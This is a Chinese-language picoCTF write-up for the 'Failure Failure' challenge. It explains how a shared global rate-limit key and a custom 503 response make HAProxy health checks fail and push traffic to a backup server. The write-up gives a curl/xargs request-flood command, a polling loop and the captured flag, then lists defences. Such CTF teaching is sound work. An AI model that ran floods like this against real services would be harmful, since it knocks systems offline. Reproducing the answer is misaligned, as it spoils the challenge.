## Challenge Metadata

- **Platform:** picoCTF
- **Category:** General Skills
- **Difficulty:** Medium
- **Author:** Bryan
- **Date:** 2026-03-30

## 一、基本資訊

- **題目名稱：** Failure Failure
- **題目類型：** General Skills
- **平台：** picoCTF 2026
- **目標：** 迫使負載平衡器切換至 backup server，並從 backup 端取得 flag

## 二、題目概述

本題模擬高可用系統中的 failover 情境。題目提供 HAProxy 設定檔與後端 Flask 應用程式碼，並提示真正的 flag 被負載平衡器擋在後方，必須強迫系統 fail over 才能拿到。

實際分析後可發現，主節點與備援節點共用同一份程式，但 backup 節點的環境變數 `IS_BACKUP=yes`，因此只有當流量被切到備援節點時，頁面才會顯示 flag。

## 三、分析目標

本次分析的主要目標如下：

1. 理解 HAProxy 健康檢查與 failover 設定
2. 確認 Flask rate limit 的實作問題
3. 設計方法讓主節點健康檢查失敗
4. 迫使 HAProxy 將流量切到 backup server
5. 取得 flag 並說明整體利用鏈

## 四、靜態分析

### 4.1 HAProxy 設定

`haproxy.cfg` 核心如下：

```cfg
frontend http-in
    bind *:80
    default_backend servers

backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

此設定表示：

- 正常流量優先導向 `s1:8000`
- `s2:9000` 為 backup server
- HAProxy 每 2 秒對 `/` 進行健康檢查
- 若連續 2 次不是 HTTP 200，主節點即被判定為 down

### 4.2 Flask 程式碼

`app.py` 核心如下：

```python
def global_rate_limit_key():
    return "global"

limiter = Limiter(
    key_func=global_rate_limit_key,
    app=app,
    default_limits=["300 per minute"]
)

@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
```

## 五、弱點判定

### 5.1 弱點描述

`global_rate_limit_key()` 永遠回傳 `"global"`，代表所有請求都共用同一個 rate-limit bucket，而不是依 IP 或 session 分流。

此外，當超過限制時，應用並非回傳 429，而是被自訂成：

```python
return "Service Unavailable: Rate limit exceeded", 503
```

### 5.2 與 HAProxy 健康檢查的交互影響

HAProxy 健康檢查要求 `/` 必須回 `200`。一旦主節點因 rate limit 被打爆，健康檢查對 `/` 的存取也會收到 `503`，於是：

- 主節點連續 2 次健康檢查失敗
- HAProxy 將主節點標示為 down
- 流量自動切到 backup server

### 5.3 弱點類型

- Misconfigured Global Rate Limiting
- Health Check Abuse
- Failover Triggering via Application Layer Response Manipulation

## 六、攻擊思路

利用流程如下：

1. 持續向首頁 `/` 發送大量請求
2. 讓主節點超過 `300 per minute` 的全域限制
3. 使首頁開始回應 `503`
4. 讓 HAProxy 健康檢查也觀察到 `503`
5. 觸發 failover 切換至 `s2` backup
6. 再次請求首頁並讀出 flag

## 七、利用過程

### 7.1 目標網址

題目實例網址為：

```text
http://mysterious-sea.picoctf.net:50150/
```

### 7.2 大量發送請求

使用 shell 產生高併發請求：

```bash
seq 1 450 | xargs -I{} -P 100 curl -s -o /dev/null http://mysterious-sea.picoctf.net:50150/
```

### 7.3 輪詢檢查是否切到 backup

```bash
while true; do
  out=$(curl -s http://mysterious-sea.picoctf.net:50150/)
  echo "$out"
  echo "$out" | grep -q 'picoCTF{' && break
  sleep 1
done
```

### 7.4 成功輸出

最終頁面由原本的：

```html
<p>No flag in this service</p>
```

變為：

```html
<p>picoCTF{f4ll0v3r_f0r_7h3_w1n_df560c35}</p>
```

## 八、利用結果

成功取得 flag：

```text
picoCTF{f4ll0v3r_f0r_7h3_w1n_df560c35}
```

## 九、完整 exploit 指令

```bash
seq 1 450 | xargs -I{} -P 100 curl -s -o /dev/null http://mysterious-sea.picoctf.net:50150/

while true; do
  out=$(curl -s http://mysterious-sea.picoctf.net:50150/)
  echo "$out"
  echo "$out" | grep -q 'picoCTF{' && break
  sleep 1
done
```

## 十、成因分析

本題的完整弱點鏈如下：

1. **全域限流設計錯誤**
   - 所有使用者共用同一個 rate-limit key。
2. **錯誤碼設計不當**
   - 超限後直接回 `503`，讓應用層過載狀態與服務不可用被混為一談。
3. **健康檢查路徑與使用者路徑相同**
   - HAProxy 用 `/` 做 health check，剛好與被限流的首頁重疊。
4. **備援節點暴露敏感內容**
   - backup server 的首頁直接顯示 flag。

上述因素組合後，攻擊者即能透過純粹的 HTTP 請求觸發整個 failover chain。

## 十一、防禦建議

### 11.1 以使用者識別做 rate limit

不應讓所有請求共用固定字串 key，至少應依 IP、session 或 API token 區分。

### 11.2 將 429 與 503 明確分離

rate limit 超限應回傳標準 429，而非誤導負載平衡器的 503。

### 11.3 健康檢查使用專用路徑

HAProxy 健康檢查應對專門的 `/healthz` 或 `/ready` 路徑進行，而不是與使用者首頁共用。

### 11.4 避免於 backup 節點直接暴露敏感資料

備援節點不應因環境變數切換而直接在首頁印出 flag 或敏感資訊。

## 十二、結論

本題是相當完整的真實世界 failover 模擬案例。攻擊者並未直接攻擊 backup server，也未繞過認證，而是利用應用層的全域限流錯誤與 HAProxy 健康檢查配置失當，間接迫使系統切流量到備援節點，最終取得 flag。此案例充分說明，分散在不同層的「小問題」一旦串起來，就可能形成可利用的完整攻擊鏈。

## 使用工具

- curl
- xargs
- shell loop
- source code review
- HAProxy configuration analysis
